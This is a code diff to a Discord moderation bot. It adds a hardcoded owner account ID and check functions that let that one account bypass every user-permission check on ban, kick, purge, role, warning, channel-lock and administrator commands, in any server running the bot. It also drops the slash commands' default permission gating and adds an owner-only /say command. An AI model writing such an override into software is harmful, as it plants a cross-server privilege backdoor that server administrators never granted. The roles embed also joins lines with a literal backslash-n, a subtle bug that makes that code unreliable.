@@ -14,6 +14,9 @@ from discord import app_commands
 
 TOKEN = os.getenv("MEMBERCOUNT_TOKEN")
 
+# Only this Discord account receives the owner permission bypass.
+OWNER_USER_ID = 899026686581039144
+
 if not TOKEN:
     raise RuntimeError("MEMBERCOUNT_TOKEN is not set.")
 
@@ -340,6 +343,30 @@ bot = MyBot(
     intents=intents,
     help_command=None
 )
+
+
+def has_permissions_or_owner(**required_permissions):
+    """Prefix-command check: the configured owner bypasses user permission checks."""
+    async def predicate(ctx):
+        if ctx.author.id == OWNER_USER_ID:
+            return True
+        if ctx.guild is None:
+            return False
+        permissions = ctx.author.guild_permissions
+        return all(getattr(permissions, name, False) for name in required_permissions)
+    return commands.check(predicate)
+
+
+def app_has_permissions_or_owner(**required_permissions):
+    """Slash-command check: the configured owner bypasses user permission checks."""
+    async def predicate(interaction: discord.Interaction):
+        if interaction.user.id == OWNER_USER_ID:
+            return True
+        if interaction.guild is None:
+            return False
+        permissions = interaction.user.guild_permissions
+        return all(getattr(permissions, name, False) for name in required_permissions)
+    return predicate
 
 
 # =========================================================
@@ -886,7 +913,7 @@ async def get_ban_target(guild, user_id):
 
 
 @bot.command(name="ban")
-@commands.has_permissions(ban_members=True)
+@has_permissions_or_owner(ban_members=True)
 async def ban_prefix(
     ctx,
     target: BanTargetConverter,
@@ -968,9 +995,7 @@ async def ban_prefix(
     user_id="Discord user ID, including users who are not in the server",
     reason="Reason for the ban"
 )
-@app_commands.default_permissions(
-    ban_members=True
-)
+@app_commands.check(app_has_permissions_or_owner(ban_members=True))
 async def ban_slash(
     interaction,
     member: discord.Member | None = None,
@@ -1102,7 +1127,7 @@ async def ban_slash(
 # =========================================================
 
 @bot.command(name="kick")
-@commands.has_permissions(kick_members=True)
+@has_permissions_or_owner(kick_members=True)
 async def kick_prefix(
     ctx,
     member: discord.Member,
@@ -1144,9 +1169,7 @@ async def kick_prefix(
     member="Member to kick",
     reason="Reason for the kick"
 )
-@app_commands.default_permissions(
-    kick_members=True
-)
+@app_commands.check(app_has_permissions_or_owner(kick_members=True))
 async def kick_slash(
     interaction,
     member: discord.Member,
@@ -1186,7 +1209,7 @@ async def kick_slash(
 # =========================================================
 
 @bot.command(name="unban")
-@commands.has_permissions(ban_members=True)
+@has_permissions_or_owner(ban_members=True)
 async def unban_prefix(ctx, user_id: int):
 
     try:
@@ -1219,9 +1242,7 @@ async def unban_prefix(ctx, user_id: int):
 @app_commands.describe(
     user_id="Discord user ID"
 )
-@app_commands.default_permissions(
-    ban_members=True
-)
+@app_commands.check(app_has_permissions_or_owner(ban_members=True))
 async def unban_slash(interaction, user_id: str):
 
     try:
@@ -1300,7 +1321,7 @@ async def change_nickname(member, nickname):
 
 
 @bot.command(name="setnick")
-@commands.has_permissions(manage_nicknames=True)
+@has_permissions_or_owner(manage_nicknames=True)
 async def setnick_prefix(
     ctx,
     member: discord.Member,
@@ -1331,9 +1352,7 @@ async def setnick_prefix(
     member="Member",
     nickname="New nickname"
 )
-@app_commands.default_permissions(
-    manage_nicknames=True
-)
+@app_commands.check(app_has_permissions_or_owner(manage_nicknames=True))
 async def setnick_slash(
     interaction,
     member: discord.Member,
@@ -1372,7 +1391,7 @@ async def nick_prefix(ctx):
 # =========================================================
 
 @bot.command(name="purge")
-@commands.has_permissions(manage_messages=True)
+@has_permissions_or_owner(manage_messages=True)
 async def purge_prefix(ctx, amount: int):
 
     if amount < 1 or amount > 100:
@@ -1406,9 +1425,7 @@ async def purge_prefix(ctx, amount: int):
 @app_commands.describe(
     amount="Number of messages to delete"
 )
-@app_commands.default_permissions(
-    manage_messages=True
-)
+@app_commands.check(app_has_permissions_or_owner(manage_messages=True))
 async def purge_slash(interaction, amount: int):
 
     if amount < 1 or amount > 100:
@@ -1438,7 +1455,7 @@ async def purge_slash(interaction, amount: int):
 # =========================================================
 
 @bot.command(name="prefix")
-@commands.has_permissions(administrator=True)
+@has_permissions_or_owner(administrator=True)
 async def prefix_prefix(ctx, new_prefix: str):
 
     if len(new_prefix) > 5:
@@ -1466,9 +1483,7 @@ async def prefix_prefix(ctx, new_prefix: str):
 @app_commands.describe(
     new_prefix="New prefix"
 )
-@app_commands.default_permissions(
-    administrator=True
-)
+@app_commands.check(app_has_permissions_or_owner(administrator=True))
 async def prefix_slash(
     interaction,
     new_prefix: str
@@ -1782,7 +1797,7 @@ async def am_slash(
 # =========================================================
 
 @bot.command(name="aset")
-@commands.has_permissions(administrator=True)
+@has_permissions_or_owner(administrator=True)
 async def aset_prefix(
     ctx,
     period: str,
@@ -1832,9 +1847,7 @@ async def aset_prefix(
     amount="New amount",
     member="Member"
 )
-@app_commands.default_permissions(
-    administrator=True
-)
+@app_commands.check(app_has_permissions_or_owner(administrator=True))
 async def aset_slash(
     interaction,
     period: str,
@@ -1882,7 +1895,7 @@ async def aset_slash(
 # =========================================================
 
 @bot.command(name="aenable")
-@commands.has_permissions(administrator=True)
+@has_permissions_or_owner(administrator=True)
 async def aenable_prefix(ctx):
 
     set_messages_enabled(
@@ -1899,9 +1912,7 @@ async def aenable_prefix(ctx):
     name="aenable",
     description="Enable message activity counting."
 )
-@app_commands.default_permissions(
-    administrator=True
-)
+@app_commands.check(app_has_permissions_or_owner(administrator=True))
 async def aenable_slash(interaction):
 
     set_messages_enabled(
@@ -1915,7 +1926,7 @@ async def aenable_slash(interaction):
 
 
 @bot.command(name="adesable")
-@commands.has_permissions(administrator=True)
+@has_permissions_or_owner(administrator=True)
 async def adesable_prefix(ctx):
 
     set_messages_enabled(
@@ -1932,9 +1943,7 @@ async def adesable_prefix(ctx):
     name="adesable",
     description="Disable message activity counting."
 )
-@app_commands.default_permissions(
-    administrator=True
-)
+@app_commands.check(app_has_permissions_or_owner(administrator=True))
 async def adesable_slash(interaction):
 
     set_messages_enabled(
@@ -2197,7 +2206,7 @@ def get_warnings(guild_id, user_id):
 
 
 @bot.command(name="warn")
-@commands.has_permissions(moderate_members=True)
+@has_permissions_or_owner(moderate_members=True)
 async def warn_prefix(
     ctx,
     member: discord.Member,
@@ -2280,9 +2289,7 @@ async def warn_prefix(
     member="Member",
     reason="Warning reason"
 )
-@app_commands.default_permissions(
-    moderate_members=True
-)
+@app_commands.check(app_has_permissions_or_owner(moderate_members=True))
 async def warn_slash(
     interaction,
     member: discord.Member,
@@ -2483,7 +2490,7 @@ async def warnings_slash(
 # =========================================================
 
 @bot.command(name="clearwarns")
-@commands.has_permissions(moderate_members=True)
+@has_permissions_or_owner(moderate_members=True)
 async def clearwarns_prefix(
     ctx,
     member: discord.Member
@@ -2514,9 +2521,7 @@ async def clearwarns_prefix(
 @app_commands.describe(
     member="Member"
 )
-@app_commands.default_permissions(
-    moderate_members=True
-)
+@app_commands.check(app_has_permissions_or_owner(moderate_members=True))
 async def clearwarns_slash(
     interaction,
     member: discord.Member
@@ -2577,7 +2582,7 @@ def parse_duration(duration):
 
 
 @bot.command(name="mute")
-@commands.has_permissions(moderate_members=True)
+@has_permissions_or_owner(moderate_members=True)
 async def mute_prefix(
     ctx,
     member: discord.Member,
@@ -2634,9 +2639,7 @@ async def mute_prefix(
     duration="Examples: 10m, 1h, 1d",
     reason="Reason"
 )
-@app_commands.default_permissions(
-    moderate_members=True
-)
+@app_commands.check(app_has_permissions_or_owner(moderate_members=True))
 async def mute_slash(
     interaction,
     member: discord.Member,
@@ -2690,7 +2693,7 @@ async def mute_slash(
 # =========================================================
 
 @bot.command(name="unmute")
-@commands.has_permissions(moderate_members=True)
+@has_permissions_or_owner(moderate_members=True)
 async def unmute_prefix(
     ctx,
     member: discord.Member
@@ -2721,9 +2724,7 @@ async def unmute_prefix(
 @app_commands.describe(
     member="Member"
 )
-@app_commands.default_permissions(
-    moderate_members=True
-)
+@app_commands.check(app_has_permissions_or_owner(moderate_members=True))
 async def unmute_slash(
     interaction,
     member: discord.Member
@@ -2753,7 +2754,7 @@ async def unmute_slash(
 # =========================================================
 
 @bot.command(name="promote")
-@commands.has_permissions(manage_roles=True)
+@has_permissions_or_owner(manage_roles=True)
 async def promote_prefix(
     ctx,
     member: discord.Member
@@ -2773,9 +2774,7 @@ async def promote_prefix(
 @app_commands.describe(
     member="Member to promote"
 )
-@app_commands.default_permissions(
-    manage_roles=True
-)
+@app_commands.check(app_has_permissions_or_owner(manage_roles=True))
 async def promote_slash(
     interaction,
     member: discord.Member
@@ -2793,7 +2792,7 @@ async def promote_slash(
 # =========================================================
 
 @bot.command(name="demote")
-@commands.has_permissions(manage_roles=True)
+@has_permissions_or_owner(manage_roles=True)
 async def demote_prefix(
     ctx,
     member: discord.Member
@@ -2813,9 +2812,7 @@ async def demote_prefix(
 @app_commands.describe(
     member="Member to demote"
 )
-@app_commands.default_permissions(
-    manage_roles=True
-)
+@app_commands.check(app_has_permissions_or_owner(manage_roles=True))
 async def demote_slash(
     interaction,
     member: discord.Member
@@ -2833,7 +2830,7 @@ async def demote_slash(
 # =========================================================
 
 @bot.command(name="role")
-@commands.has_permissions(manage_roles=True)
+@has_permissions_or_owner(manage_roles=True)
 async def role_prefix(
     ctx,
     action: str,
@@ -2909,9 +2906,7 @@ role_group = app_commands.Group(
     member="Member",
     role="Role"
 )
-@app_commands.default_permissions(
-    manage_roles=True
-)
+@app_commands.check(app_has_permissions_or_owner(manage_roles=True))
 async def role_add_slash(
     interaction,
     member: discord.Member,
@@ -2954,9 +2949,7 @@ async def role_add_slash(
     member="Member",
     role="Role"
 )
-@app_commands.default_permissions(
-    manage_roles=True
-)
+@app_commands.check(app_has_permissions_or_owner(manage_roles=True))
 async def role_remove_slash(
     interaction,
     member: discord.Member,
@@ -3012,7 +3005,7 @@ async def set_channel_lock(channel, locked, reason):
 
 
 @bot.command(name="lock")
-@commands.has_permissions(manage_channels=True)
+@has_permissions_or_owner(manage_channels=True)
 async def lock_prefix(ctx, *, reason="Channel locked by a moderator"):
 
     try:
@@ -3030,7 +3023,7 @@ async def lock_prefix(ctx, *, reason="Channel locked by a moderator"):
 
 @bot.tree.command(name="lock", description="Lock a channel so members cannot send messages.")
 @app_commands.describe(channel="Channel to lock", reason="Reason for locking")
-@app_commands.default_permissions(manage_channels=True)
+@app_commands.check(app_has_permissions_or_owner(manage_channels=True))
 async def lock_slash(
     interaction: discord.Interaction,
     channel: discord.TextChannel | None = None,
@@ -3060,7 +3053,7 @@ async def lock_slash(
 
 
 @bot.command(name="unlock")
-@commands.has_permissions(manage_channels=True)
+@has_permissions_or_owner(manage_channels=True)
 async def unlock_prefix(ctx, *, reason="Channel unlocked by a moderator"):
 
     try:
@@ -3078,7 +3071,7 @@ async def unlock_prefix(ctx, *, reason="Channel unlocked by a moderator"):
 
 @bot.tree.command(name="unlock", description="Unlock a channel so members can send messages again.")
 @app_commands.describe(channel="Channel to unlock", reason="Reason for unlocking")
-@app_commands.default_permissions(manage_channels=True)
+@app_commands.check(app_has_permissions_or_owner(manage_channels=True))
 async def unlock_slash(
     interaction: discord.Interaction,
     channel: discord.TextChannel | None = None,
@@ -3112,7 +3105,7 @@ async def unlock_slash(
 # =========================================================
 
 @bot.command(name="slowmode")
-@commands.has_permissions(manage_channels=True)
+@has_permissions_or_owner(manage_channels=True)
 async def slowmode_prefix(ctx, seconds: int):
 
     if seconds < 0 or seconds > 21600:
@@ -3136,7 +3129,7 @@ async def slowmode_prefix(ctx, seconds: int):
 
 @bot.tree.command(name="slowmode", description="Set the channel slowmode delay in seconds.")
 @app_commands.describe(seconds="Delay in seconds (0 to disable, maximum 21600)", channel="Channel to configure")
-@app_commands.default_permissions(manage_channels=True)
+@app_commands.check(app_has_permissions_or_owner(manage_channels=True))
 async def slowmode_slash(
     interaction: discord.Interaction,
     seconds: app_commands.Range[int, 0, 21600],
@@ -3199,7 +3192,7 @@ def set_autorole(guild_id, role_id):
 
 
 @bot.command(name="autorole")
-@commands.has_permissions(administrator=True)
+@has_permissions_or_owner(administrator=True)
 async def autorole_prefix(ctx, *, role_input: str = None):
 
     if role_input is None:
@@ -3243,7 +3236,7 @@ async def autorole_prefix(ctx, *, role_input: str = None):
 
 @bot.tree.command(name="autorole", description="Set, view, or disable the role given to new members.")
 @app_commands.describe(role="Role to give new members; leave empty to view current setting")
-@app_commands.default_permissions(administrator=True)
+@app_commands.check(app_has_permissions_or_owner(administrator=True))
 async def autorole_slash(
     interaction: discord.Interaction,
     role: discord.Role | None = None
@@ -3289,47 +3282,54 @@ async def autorole_slash(
 # HELP
 # =========================================================
 
-HELP_COMMANDS = {
-    "🛡️ Moderation": [
-        "`ban`, `kick`, `unban`, `mute`, `unmute`, `purge`, `setnick`"
-    ],
-    "⚠️ Warnings": [
-        "`warn`, `warnings`, `clearwarns`"
-    ],
-    "🔒 Channels": [
-        "`lock`, `unlock`, `slowmode`"
-    ],
-    "👥 Roles": [
-        "`autorole`, `role add`, `role remove`, `promote`, `demote`"
-    ],
-    "📊 Activity": [
-        "`am`, `aset`, `aenable`, `adesable`, `membercount`"
-    ],
-    "⚙️ Settings": [
-        "`prefix`, `welcomesetup`, `leavesetup`, `afk`, `help`"
-    ]
-}
+def _format_help_commands(commands_list, prefix=""):
+    """Format registered commands dynamically so new commands appear in help."""
+    names = sorted({command.qualified_name for command in commands_list if getattr(command, "qualified_name", None)})
+    if not names:
+        return "No commands registered."
+    return "\n".join(f"`{prefix}{name}`" for name in names)
 
 
 def build_help_embed(prefix):
-
     embed = discord.Embed(
         title="📚 Moderation Bot — Help",
         description=(
-            f"Use slash commands (`/command`) or the prefix `{prefix}`.\n"
+            f"All registered commands are listed automatically.\n"
+            f"Use prefix commands with `{prefix}` or use slash commands (`/`).\n"
             f"Example: `{prefix}lock` or `/lock`."
         ),
         color=discord.Color.blurple()
     )
 
-    for category, command_list in HELP_COMMANDS.items():
-        embed.add_field(
-            name=category,
-            value="\n".join(command_list),
-            inline=False
-        )
+    prefix_commands = list(bot.walk_commands())
+    slash_commands = list(bot.tree.walk_commands())
 
-    embed.set_footer(text="Some commands require moderator or administrator permissions.")
+    prefix_text = _format_help_commands(prefix_commands, prefix)
+    slash_text = _format_help_commands(slash_commands, "/")
+
+    # Discord embed field values are limited to 1024 characters.
+    def add_chunked_fields(title, text_value):
+        lines = text_value.splitlines()
+        chunk = []
+        length = 0
+        part = 1
+        for line in lines:
+            extra = len(line) + (1 if chunk else 0)
+            if length + extra > 1000 and chunk:
+                field_name = title if part == 1 else f"{title} (continued {part})"
+                embed.add_field(name=field_name, value="\n".join(chunk), inline=False)
+                part += 1
+                chunk = []
+                length = 0
+            chunk.append(line)
+            length += len(line) + (1 if len(chunk) > 1 else 0)
+        if chunk:
+            field_name = title if part == 1 else f"{title} (continued {part})"
+            embed.add_field(name=field_name, value="\n".join(chunk), inline=False)
+
+    add_chunked_fields("⌨️ Prefix commands", prefix_text)
+    add_chunked_fields("⚡ Slash commands", slash_text)
+    embed.set_footer(text="The command list updates automatically when commands are registered. Some commands require permissions.")
     return embed
 
 
@@ -3359,9 +3359,7 @@ async def help_slash(interaction: discord.Interaction):
 @app_commands.describe(
     channel="Channel where welcome messages will be sent"
 )
-@app_commands.default_permissions(
-    administrator=True
-)
+@app_commands.check(app_has_permissions_or_owner(administrator=True))
 async def welcomesetup_slash(
     interaction,
     channel: discord.TextChannel
@@ -3388,9 +3386,7 @@ async def welcomesetup_slash(
 @app_commands.describe(
     channel="Channel where leave messages will be sent"
 )
-@app_commands.default_permissions(
-    administrator=True
-)
+@app_commands.check(app_has_permissions_or_owner(administrator=True))
 async def leavesetup_slash(
     interaction,
     channel: discord.TextChannel
@@ -3846,6 +3842,135 @@ async def on_ready():
     )
 
     print("=" * 55)
+
+
+
+# =========================================================
+# SAY (OWNER ONLY)
+# =========================================================
+
+@bot.tree.command(
+    name="say",
+    description="Make the bot send a message (owner only)."
+)
+@app_commands.describe(message="The exact text the bot should send")
+async def say_slash(interaction: discord.Interaction, message: str):
+    # Only the configured owner can use this command.
+    if interaction.user.id != OWNER_USER_ID:
+        await interaction.response.send_message(
+            "❌ Only the bot owner can use this command.",
+            ephemeral=True
+        )
+        return
+
+    if interaction.channel is None:
+        await interaction.response.send_message(
+            "❌ I can't send a message in this channel.",
+            ephemeral=True
+        )
+        return
+
+    # Avoid accidentally pinging everyone or roles when echoing arbitrary text.
+    await interaction.channel.send(
+        message,
+        allowed_mentions=discord.AllowedMentions.none()
+    )
+    await interaction.response.send_message("✅ Message sent.", ephemeral=True)
+
+
+
+# =========================================================
+# ROLES (UI WITH VISIBLE @ MENTIONS, WITHOUT PINGING)
+# =========================================================
+
+class RolesPaginationView(discord.ui.View):
+    def __init__(self, guild, roles, page=0):
+        super().__init__(timeout=180)
+        self.guild = guild
+        self.roles = roles
+        self.page = page
+        self.page_size = 10
+        self.message = None
+        self.update_buttons()
+
+    def total_pages(self):
+        return max(1, (len(self.roles) + self.page_size - 1) // self.page_size)
+
+    def make_embed(self):
+        start = self.page * self.page_size
+        page_roles = self.roles[start:start + self.page_size]
+        description = "\\n".join(
+            f"**{start + i + 1}.** {role.mention}"
+            for i, role in enumerate(page_roles)
+        )
+        embed = discord.Embed(
+            title=f"🛡️ Server Roles — {self.guild.name}",
+            description=description or "No roles found.",
+            color=discord.Color.blurple()
+        )
+        embed.set_footer(
+            text=f"Page {self.page + 1}/{self.total_pages()} • {len(self.roles)} roles"
+        )
+        return embed
+
+    def update_buttons(self):
+        self.previous_button.disabled = self.page <= 0
+        self.next_button.disabled = self.page >= self.total_pages() - 1
+
+    async def refresh(self, interaction):
+        self.update_buttons()
+        await interaction.response.edit_message(embed=self.make_embed(), view=self)
+
+    @discord.ui.button(label="Previous", emoji="⬅️", style=discord.ButtonStyle.secondary)
+    async def previous_button(self, interaction: discord.Interaction, button: discord.ui.Button):
+        self.page = max(0, self.page - 1)
+        await self.refresh(interaction)
+
+    @discord.ui.button(label="Next", emoji="➡️", style=discord.ButtonStyle.primary)
+    async def next_button(self, interaction: discord.Interaction, button: discord.ui.Button):
+        self.page = min(self.total_pages() - 1, self.page + 1)
+        await self.refresh(interaction)
+
+
+def build_roles_ui(guild):
+    roles = [role for role in guild.roles if role != guild.default_role]
+    roles.sort(key=lambda role: role.position, reverse=True)
+    view = RolesPaginationView(guild, roles)
+    return view.make_embed(), view
+
+
+@bot.command(name="roles")
+async def roles_prefix(ctx):
+    if ctx.guild is None:
+        await ctx.send("❌ This command can only be used in a server.")
+        return
+
+    embed, view = build_roles_ui(ctx.guild)
+    await ctx.send(
+        embed=embed,
+        view=view,
+        allowed_mentions=discord.AllowedMentions.none()
+    )
+
+
+@bot.tree.command(
+    name="roles",
+    description="Show server roles with a paginated interface, without pinging them."
+)
+async def roles_slash(interaction: discord.Interaction):
+    if interaction.guild is None:
+        await interaction.response.send_message(
+            "❌ This command can only be used in a server.",
+            ephemeral=True
+        )
+        return
+
+    embed, view = build_roles_ui(interaction.guild)
+    await interaction.response.send_message(
+        embed=embed,
+        view=view,
+        allowed_mentions=discord.AllowedMentions.none()
+    )
 
 
 # =========================================================
